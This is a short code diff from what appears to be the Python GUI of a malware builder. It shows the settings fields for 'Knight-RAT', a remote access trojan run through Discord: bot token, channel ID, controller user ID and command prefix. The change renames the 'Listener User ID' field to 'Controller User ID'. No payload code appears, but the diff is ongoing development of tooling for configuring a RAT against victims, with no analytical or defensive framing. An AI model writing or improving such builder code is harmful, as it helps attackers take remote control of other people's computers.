@@ -562,7 +562,7 @@ def _functions():
                         on_change=lambda e: change_data('knight_bot_token', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
                     ui.input(label='Knight-RAT Channel ID', placeholder='Knight on top baby',
                         on_change=lambda e: change_data('knight_channel_id', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
-                    ui.input(label='Knight-RAT Listener User ID', placeholder='Knight on top baby',
+                    ui.input(label='Knight-RAT Controller User ID', placeholder='Put your user ID here',
                         on_change=lambda e: change_data('knight_user_id', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
                     ui.input(label='Knight-RAT Command Prefix', placeholder='Knight on top baby',
                         on_change=lambda e: change_data('knight_prefix', e.value)).bind_visibility_from(_knight_rat, 'value').props('inline color=yellow-7')
